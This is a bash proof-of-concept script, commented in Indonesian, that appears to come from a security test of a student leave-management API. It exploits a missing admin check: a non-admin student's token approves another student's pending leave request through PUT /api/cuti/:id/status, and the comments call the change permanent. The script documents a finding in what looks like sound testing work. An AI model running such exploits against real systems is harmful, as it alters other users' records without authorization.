#!/usr/bin/env bash
# S11 - Missing authorization pada keputusan status cuti (PUT /api/cuti/:id/status)
# Sink: src/routes/cutiRoutes.js -> route tanpa authorize('admin')
# Prasyarat: andi (bukan admin) tahu UUID pengajuan cuti milik budi berstatus 'diajukan'.
# DESTRUKTIF: mengubah status cuti budi secara permanen (tidak dipulihkan, karena alur
# normal tidak mengizinkan mundur dari 'disetujui'/'ditolak' ke 'diajukan').
set -euo pipefail
cd "$(dirname "$0")"
source ./00-login.sh
B="$BASE_URL"; ANH="Authorization: Bearer $ANDI_TOKEN"; BUH="Authorization: Bearer $BUDI_TOKEN"

echo "== Cari pengajuan cuti budi yang masih berstatus 'diajukan' =="
BUDI_CUTI=$(curl -s -m 10 "$B/api/cuti/me" -H "$BUH" \
  | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{const j=JSON.parse(d);const row=(j.data||[]).find(x=>x.status==='diajukan');if(!row)process.exit(1);process.stdout.write(row.id)})") || true

if [ -z "${BUDI_CUTI:-}" ]; then
  echo "Budi tidak punya pengajuan berstatus 'diajukan'. Coba buat satu (bisa gagal kalau sudah ada pengajuan aktif lain di semester ini)..."
  CREATE=$(curl -s -m 10 -X POST "$B/api/cuti/me" -H "$BUH" -H 'Content-Type: application/json' \
    -d "{\"semester\":\"$SEMESTER_AKTIF\",\"kategori\":\"kesehatan\",\"alasan\":\"PoC S11\",\"alamat_cuti\":\"Jl Uji S11\",\"nomor_telepon\":\"081200000098\"}")
  echo "$CREATE"
  BUDI_CUTI=$(echo "$CREATE" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{process.stdout.write(JSON.parse(d).data.id)}catch(e){}})") || true
fi

if [ -z "${BUDI_CUTI:-}" ]; then
  echo
  echo "KESIMPULAN: TIDAK BISA DIUJI pada run ini (budi tidak punya pengajuan berstatus 'diajukan' dan tidak bisa membuat yang baru, kemungkinan karena aturan satu pengajuan aktif per semester sudah terpakai oleh run PoC sebelumnya). Bukti S11 yang sudah terkonfirmasi sebelumnya ada di hasil-eksperimen/20261010/SKENARIO_SERANGAN.md."
  exit 0
fi
echo "ID cuti budi (status diajukan): $BUDI_CUTI"

echo "== Kontrol pembanding: endpoint admin lain (GET /api/cuti) tetap 403 untuk andi =="
curl -s -m 10 "$B/api/cuti" -H "$ANH" -w " | HTTP %{http_code}\n"

echo "== S11: andi (role mahasiswa, BUKAN admin) putuskan status cuti MILIK BUDI =="
RESP=$(curl -s -m 10 -X PUT "$B/api/cuti/$BUDI_CUTI/status" -H "$ANH" -H 'Content-Type: application/json' \
  -d '{"status":"disetujui","catatan_admin":"PoC S11 - disetujui oleh mahasiswa lain"}' -w "\nHTTP %{http_code}")
echo "$RESP"
CODE=$(echo "$RESP" | tail -1 | grep -oE '[0-9]{3}')

echo
if [ "$CODE" = "200" ]; then
  echo "KESIMPULAN: TERBUKTI. Mahasiswa (bukan admin) berhasil memutuskan/menyetujui pengajuan cuti milik mahasiswa lain, sementara endpoint admin lain menolak token yang sama dengan 403."
else
  echo "KESIMPULAN: TIDAK TERBUKTI pada percobaan ini (HTTP $CODE)."
fi
